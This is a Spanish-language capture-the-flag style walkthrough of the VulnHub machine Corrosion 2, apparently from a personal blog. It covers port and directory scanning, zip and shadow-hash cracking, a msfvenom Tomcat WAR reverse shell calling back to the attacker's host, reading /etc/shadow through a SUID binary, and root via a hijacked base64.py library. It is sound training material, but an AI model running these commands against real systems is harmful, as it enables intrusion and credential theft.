---
layout: single
title: Corrosion 2 - VulnHub
excerpt: " Difficulty: Medium Hint: Enumeration is key."
date: 2023-02-02
classes: wide
header:
  teaser: /blog/assets/images/vh-writeup-corrosion2/corrosion2.png
  teaser_home_page: true
  icon: /blog/assets/images/vulnhub.webp
categories:
  - vulnhub
tags:
  - Tomcat
  - RCE
  - hashcat
  - john
  - python
---

Difficulty: Medium
Hint: Enumeration is key.

# Summary
- IP: 192.168.0.107
- Ports: 22,80,8080
- OS: Linux (Ubuntu Bionic)
- Services & Applications:
	-  22 -> OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
	-  80 -> Apache httpd 2.4.41
	-  8080 -> Apache Tomcat 9.0.53

# Recon

- Escaneo básico de puertos:

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.0.107 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$nmap -p22,80,8080 -sCV 192.168.0.107 -oN targeted
```


# Análisis de página web:

- En el puerto 80 no encontramos nada interesante, en el puerto 8080 vemos la página inicial de "Apache tomcat", hacemos un análisis de directorios con gobuster:

```bash
$gobuster dir -u http://192.168.0.107:8080/ -w /usr//share/SecLists/Discovery/Web-Content/common.txt -t 100 -x txt,zip,backup,bak
```

- Encontramos un archivo "backup.zip", lo descargamos en nuestra máquina e intentamos descomprimirlo.

```bash
$unzip backup.zip
```


# Password Cracking con zip2john:

- Vemos que está cifrado con contraseña, la intentamos romper con John:

```bash
$zip2john backup.zip > pass.hash
$john -w:/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt pass.hash
```

- Encontramos la credencial: "@administrator_hi5", la usamos para descomprimir el archivo:

```bash
$unzip backup.zip
```

- Vemos un archivo llamado "tomcat_users.xml" lo abrimos, y encontramos al usuario "admin" con su respectiva credencial, la usamos para acceder en la página principal de tomcat, en el directorio "/manager" encontrado anteriormente con gobuster.

# RCE en página de Tomcat con archivo WAR malicioso:

- En el directorio "/manager" vemos la página de administración del servicio tomcat, bucamos el apartado de "WAR file to deploy" en el que se nos permite la subida de archivos ".war", lo aprovechamos para subir un ".war" malicioso que nos entable una reverse shell, el cual crearemos con "msfvenom":

```bash
$msfvenom -p java/shell_reverse_tcp -f war -o shell.war LHOST=192.168.0.108 LPORT=443
```

- Subimos el archivo creado y, estando en escucha en el puerto 443 en nuestra máquina atacante, nos dirigimos al apartado de "applications" en el cual encontraremos el directorio "shell", lo abrimos y ganamos acceso al sistema como el usuario "tomcat", hacemos tratamiento de la tty.


# ESCALANDO PRIVILEGIOS:

- Intentamos pivotar a otro usuario válido del sistema usando las credenciales que hemos recolectado hasta ahora, y vemos que el usuario "jaye" reutiliza una de esas contraseñas.

- Buscamos permisos SUID y encontramos lo siguiente:

```
/home/jaye/Files/look
```

- Analizamos el binario "look" y vemos que el propietario es root y tiene solo permiso de ejecución para otros, lo ejecutamos para verificar en qué consiste:

```bash
$./look
usage: look [-bdf] [-t char] string [file ...]
```

- Nos pide como parámetro un caracter y un archivo que contenga texto, así que le pasamos el /etc/passwd

```bash
$./look a /etc/passwd
```

- El output nos arroja el contenido del archivo "etc/passwd" pero solo las lineas que comienzan con "a", como lo que hace es mostrar el contenido de un archivo de texto, y lo hace como root, podríamos pasarle el archivo "/etc/shadow" en busca de hashes:

```bash
$./look a /etc/shadow
```

- Y efectivamente, nos muestra el contenido el archivo "/etc/shadow", intentamos comandos posibles para que nos muestre todo el contenido:

```bash
$./look "" /etc/shadow
```

- Podemos ver los hashes de los usuarios con cifrado SHA512, en este caso intentaremos romper el hash del usuario "randy", así que copiamos el hash y lo crackeamos con John; En este caso, al estar la credencial en las últimas lineas del diccionario "rockyou.txt" usaré "hashcat" para que el proceso sea mucho más rápido:

```bash
$nano password

$ssh miusuario@maquinawindows

C \Users\miusuario\Desktop\hashcat.exe -m 1800 -a 0 password rockyou.txt

```


- Obtenemos la contraseña del usuario "randy", pivotamos a dicho usuario.

- Buscamos permisos de sudoers y encontramos lo siguiente:

```
User randy may run the following commands on corrosion:
    (root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
```

- Es decir, podemos ejecutar como root el archivo "randombase64.py", analizamos este archivo para ver qué hace por detrás:

```python
import base64

message = input("Enter your string: ")
message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode('ascii')

print(base64_message)
```

- Vemos que está importando la librería "base64", hacemos una búsqueda para encontrar la ubicación del archivo "base64.py" y vemos si tenemos permisos de escritura:

```bash
$find / -name base64.py 2>/dev/null
$ls -l /usr/lib/python3.8/base64.py
```

- Vemos que sí tenemos permisos para modificar dicho archivo, así que aprovechamos para inyectarle código en python el cual otorgue permisos SUID a la bash, puesto que al ejecutar el archivo "randombase64.py" se hará como root:

```bash
$nano /usr/lib/python3.8/base64.py
```

```python
#! /usr/bin/python3.8

import os
os.system("chmod u+s /bin/bash")
```

- Ejecutamos el archivo con permiso de sudoer:

```bash
$sudo /usr/bin/python3.8 /home/randy/randombase64.py
```

- Y si todo ha ido bien, podremos ejecutar la bash con privilegios, y seremos root:

```bash
$bash -p
```
